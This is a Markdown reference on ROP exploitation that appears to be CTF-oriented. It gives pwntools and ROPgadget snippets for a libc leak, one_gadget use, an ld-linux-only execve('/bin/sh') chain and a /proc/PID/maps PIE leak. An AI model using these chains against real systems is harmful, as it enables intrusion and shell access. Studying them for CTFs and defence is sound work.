# ROP Gadgets

## Finding Gadgets

Two tools: `ROPgadget` (slow, thorough) and pwntools `ROP` (fast, integrated).

```bash
ROPgadget --binary ./binary              # dump all gadgets
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep "syscall"
ROPgadget --binary ./libc.so.6 > gadgets.txt  # search libc
```

```python
from pwn import *
e = ELF('./binary')
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address           # for stack alignment
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
leave_ret = rop.find_gadget(['leave', 'ret']).address  # stack pivot
syscall = rop.find_gadget(['syscall', 'ret']).address
```

### Gadget naming

Gadgets are usually named by their last instruction, e.g., `pop_rdi_ret` means `pop rdi; ret`. Use this consistently.

```python
gadgets = {
    'pop_rdi_ret':  rop.find_gadget(['pop rdi', 'ret']).address,
    'pop_rsi_ret':  rop.find_gadget(['pop rsi', 'ret']).address,
    'pop_rdx_ret':  rop.find_gadget(['pop rdx', 'ret']).address,
    'pop_rax_ret':  rop.find_gadget(['pop rax', 'ret']).address,
    'ret':          rop.find_gadget(['ret']).address,
    'syscall_ret':  rop.find_gadget(['syscall', 'ret']).address,
}
```

## Building Chains

### Auto chain with `ROP()`

The pwntools `ROP` object can auto-build simple chains.

```python
rop = ROP(e)
rop.puts(e.got['puts'])  # puts(puts@GOT) - leaks libc
rop.main()               # return to main for second overflow
log.info(rop.dump())
payload1 = flat({offset: rop.chain()})
```

### Manual chain

For complex chains, build as a list of addresses and values.

```python
chain = [pop_rdi, e.got['puts'], e.plt['puts'], e.symbols['main']]
payload = flat({offset: chain})
```

## Pipe-Friendly Gadgets

Calling `read(0, bss, 0x100)` requires `rdi=0, rsi=bss, rdx=0x100`. If you lack `pop rdx`, use gadgets that set rdx as a side effect (like `mov rdx, rbx;` from CSU, or a `xor rdx, rdx` followed by `inc ...` from a function body).

For x86-64 syscalls:

```
rdi = arg1, rsi = arg2, rdx = arg3, r10 = arg4, r8 = arg5, r9 = arg6
rax = syscall number, syscall
```

## Address References

```python
e.symbols['main']       # function address
e.got['puts']           # GOT entry (contains libc puts() address after resolution)
e.plt['puts']           # PLT stub (for calling puts)
e.bss()                 # writable memory area
e.bss(0x100)            # BSS + offset (avoid overlap)
e.entry                 # entry point
next(e.search(b'/bin/sh'))   # search for string in binary

libc.symbols['system']          # function in libc
libc.symbols['__libc_start_main']  # often used for offset calculation
next(libc.search(b'/bin/sh'))   # /bin/sh string in libc
```

## one_gadget

Automatically find `execve("/bin/sh", NULL, NULL)` gadgets in libc. Requires specific register/stack state.

```bash
one_gadget ./libc.so.6
# Output: 0xebcf5  constraints: [rsp+0x50] == NULL
```

```python
libc.address = leak - libc.symbols['puts']
payload = flat({offset: [ret, libc.address + 0xebcf5]})
# ret gadget for alignment, then one_gadget
```

Check constraints printed by one_gadget. Common constraints:

- `[rsp+0x40] == NULL` - stack must be zeroed at that offset
- `r12 == NULL` or `rbx == NULL` - register must be null

## ld-linux Only ROP

**When:** Binary is stripped and the only usable code comes from the dynamic linker (ld-linux). `getauxval(AT_BASE)` reveals ld's base address.

**How it works:** The dynamic linker (`ld-linux-x86-64.so.2`) has its own gadgets. Find them with `ROPgadget --binary ./ld-linux-x86-64.so.2`. Use them to write `/bin/sh` to writable memory, set up registers, and syscall execve.

```python
base = ld_leak
pop_rdi_rbp = base + 0x25ac
pop_rsi_rbp = base + 0x59ab
mov_qword_rsi_rax = base + 0x141e5  # write rax to [rsi]
pop_rax = base + 0x1548a
bss = base + 0x381f0                 # writable area in ld

# Write "/bin/sh" to bss, then execve
rop = flat([
    pop_rsi_rbp, bss, 0,
    pop_rax, b'/bin/sh\x00',
    mov_qword_rsi_rax,       # bss now has "/bin/sh"
    pop_rdi_rbp, bss, 0,     # rdi = "/bin/sh"
    pop_rsi_rbp, 0, 0,       # rsi = NULL (argv)
    pop_rax, 59,             # rax = execve syscall number
    syscall_gadget,
])
```

Find the exact gadgets for your ld version:

```bash
ROPgadget --binary ./ld-linux-x86-64.so.2 | grep -E "pop rdi|pop rsi|pop rax|mov qword ptr \[rsi\], rax"
```

## Custom Gadget Scanning with Capstone

When you need to find gadgets by raw instruction patterns (e.g., scanning dumped firmware, non-ELF binaries, or checking if specific instruction bytes appear at a given offset), use `capstone` directly:

```python
from capstone import *

with open('./binary', 'rb') as f:
    data = f.read()

md = Cs(CS_ARCH_X86, CS_MODE_64)
md.skipdata = True     # skip data bytes gracefully

base = 0x400000
target_vma = 0x4011bf
target_file = target_vma - base

for off in range(0x40):                                   # scan 0x40 bytes
    chunk = data[target_file + off: target_file + off + 30]
    for insn in md.disasm(chunk, target_vma + off):
        if insn.mnemonic == 'mov' and 'rsp' in insn.op_str:
            print(f"  +0x{off:02x} ({hex(target_vma+off)}): "
                  f"{insn.mnemonic} {insn.op_str}")
        break  # only first instruction at each offset
```

Useful for:

- Finding gadgets at specific hex offsets in raw dumps
- Scanning shellcode for instruction patterns
- Checking byte sequences before patching

## Multi-Connection PIE Leak

**When:** You need PIE base but have no local leak. If the server allows multiple concurrent connections and has a `/proc/PID/maps` read primitive, leak the binary base via another connection.

```python
io1 = start()
io1.sendline(b"read /proc/self/stat")
pid = int(io1.recv().split()[0])    # leak our PID via connection 1

io2 = start()
io2.sendline(f"read /proc/{pid}/maps".encode())
line = io2.recvline().decode()      # read memory maps of connection 1
pie_base = int(line.split('-')[0], 16)

io3 = start()
io3.sendline(ROP_with_known_base(pie_base))
```
